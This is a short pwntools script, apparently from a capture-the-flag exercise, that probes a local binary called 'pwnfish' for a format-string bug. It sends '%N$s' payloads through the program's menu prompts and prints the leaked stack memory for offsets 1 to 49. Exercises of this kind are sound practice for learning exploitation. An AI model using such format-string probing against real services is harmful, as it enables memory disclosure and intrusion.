
from pwn import *

context.log_level = "warn"

binary = "./build/pwnfish"

elf = context.binary = ELF(binary, checksec=False)

context.terminal = ["cmd.exe", "/c", "start", "wsl.exe"]

gdbscript = """
break *catch_fish
c
"""

for i in range(1, 50):
    try:
        p = process(binary)

        payload = f"%{i}$s".encode()
        payload += b"aaaabaaacaaadaaaeaaafaaagaaahaaa"

        p.recvuntil(b"Choice: ")
        p.sendline(b"1")
        p.recvuntil(b"Name your new pet: ")
        # p.sendline(f"%{i}$s".encode())
        p.sendline(payload)

        p.recvuntil(b"Choice: ")
        p.sendline(b"2")

        p.recvuntil(b"Enter name of fish: ")
        # p.sendline(f"%{i}$s".encode())
        p.sendline(payload)
        p.recvline()

        leak = p.recvline()
        print(f"{i}: {leak}")
        # info("i: %#x", leak)
        # p.recvuntil(b"Choice: ")
        # p.sendline(b"1")
        # p.recvuntil(b"Name your new pet: ")
        #
        # p.sendline(f"%{i}$p".encode())
        #
        # p.recvuntil(b"Choice: ")
        # p.sendline(b"2")
        # p.recvuntil(b"Pet fish: ")
        # leaked = p.recvline()
        # p.recvuntil(b"Choice: ")
        # print(f"{i}: {leaked}")

        p.close()
    except:
        pass
